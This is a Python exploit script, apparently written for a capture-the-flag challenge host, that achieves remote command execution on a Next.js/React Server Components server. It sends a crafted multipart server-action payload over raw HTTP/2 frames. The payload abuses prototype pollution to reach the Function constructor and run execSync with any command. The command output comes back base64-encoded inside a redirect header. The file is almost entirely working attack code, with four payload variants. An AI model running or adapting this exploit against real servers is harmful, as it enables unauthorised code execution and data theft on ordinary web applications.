#!/usr/bin/env python3
"""
Debug RCE - step by step testing of what works
"""
import socket, ssl, struct, time, re, base64, sys, json
from urllib.parse import unquote
from hpack import Encoder, Decoder

HOST = 'funicular-gm2cxozn.alfactf.ru'

def test_version(version_name, cmd, prefix_payload):
    """Test specific RCE version"""
    print(f"\n🔍 Testing {version_name}: {cmd}")

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    parts = []
    parts.append(f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{part0}\r\n")
    parts.append(f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n")
    parts.append(f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n")
    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])

    raw = socket.create_connection((HOST, 443), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00")

    try:
        sock.settimeout(2)
        sock.recv(65536)
    except: pass
    sock.settimeout(15)

    body_bytes = body.encode()

    enc = Encoder()
    headers = enc.encode([
        (":method", "POST"), (":scheme", "https"), (":authority", HOST), (":path", "/"),
        ("user-agent", "Mozilla/5.0"), ("content-type", content_type),
        ("content-length", str(len(body_bytes))), ("trailer", "next-action")
    ])

    trailer = enc.encode([("next-action", "x")])

    sid = 1
    sock.sendall(struct.pack(">I", len(headers))[1:] + b"\x01\x04" + struct.pack(">I", sid) + headers)
    sock.sendall(struct.pack(">I", len(body_bytes))[1:] + b"\x00\x00" + struct.pack(">I", sid) + body_bytes)
    sock.sendall(struct.pack(">I", len(trailer))[1:] + b"\x01\x05" + struct.pack(">I", sid) + trailer)

    decoder = Decoder()
    headers_recv = {}
    body_recv = b""
    end_time = time.time() + 15

    while time.time() < end_time:
        try:
            hdr = sock.recv(9)
            if len(hdr) < 9: break
            length, frame_type, flags = struct.unpack(">I", b"\x00" + hdr[0:3])[0], hdr[3], hdr[4]
            stream_id = struct.unpack(">I", hdr[5:9])[0] & 0x7FFFFFFF

            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk: break
                payload += chunk

            if frame_type == 1:
                try:
                    decoded_headers = decoder.decode(payload)
                    for name, value in decoded_headers:
                        name_str = name.decode() if isinstance(name, bytes) else name
                        value_str = value.decode() if isinstance(value, bytes) else value
                        if name_str.lower() in ['x-action-redirect', 'location']:
                            headers_recv[name_str.lower()] = value_str
                except: pass
            elif frame_type == 0:
                body_recv += payload

            if stream_id == sid and (flags & 1): break
        except: break

    sock.close()

    # Check results
    success = False
    for header_name in ["x-action-redirect", "location"]:
        if header_name in headers_recv:
            header_val = headers_recv[header_name]
            match = re.search(r'/login\?a=([^;&]+)', header_val)
            if match:
                try:
                    result_b64 = unquote(match.group(1))
                    result = base64.b64decode(result_b64).decode('utf-8', errors='ignore')
                    print(f"    ✅ SUCCESS: {result}")
                    success = True
                except Exception as e:
                    print(f"    ❌ Decode error: {e}")

    if not success:
        body_str = body_recv.decode('utf-8', errors='ignore')
        if 'digest' in body_str:
            digest_match = re.search(r'"digest":"([^"]+)"', body_str)
            if digest_match:
                print(f"    ❌ FAILED (digest: {digest_match.group(1)})")
        else:
            print(f"    ❌ FAILED (no digest)")

def main():
    cmd = sys.argv[1] if len(sys.argv) > 1 else "whoami"

    # Test 1: Original working version (simple escaping)
    cmd_escaped = cmd.replace("'", "\\'")
    payload1 = f"var res=process.mainModule.require('child_process').execSync('{cmd_escaped}',{{'timeout':5000}}).toString('base64');throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    test_version("V1-Original", cmd, payload1)

    # Test 2: JSON escaping but simple execSync
    cmd_json = json.dumps(cmd)
    payload2 = f"var res=process.mainModule.require('child_process').execSync({cmd_json},{{'timeout':5000}}).toString('base64');throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    test_version("V2-JSON-escaping", cmd, payload2)

    # Test 3: Increased timeout only
    payload3 = f"var res=process.mainModule.require('child_process').execSync('{cmd_escaped}',{{'timeout':15000}}).toString('base64');throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    test_version("V3-Long-timeout", cmd, payload3)

    # Test 4: Different encoding parameter
    payload4 = f"var res=process.mainModule.require('child_process').execSync({cmd_json},{{'timeout':5000,encoding:'base64'}});throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    test_version("V4-Encoding-param", cmd, payload4)

if __name__ == "__main__":
    main()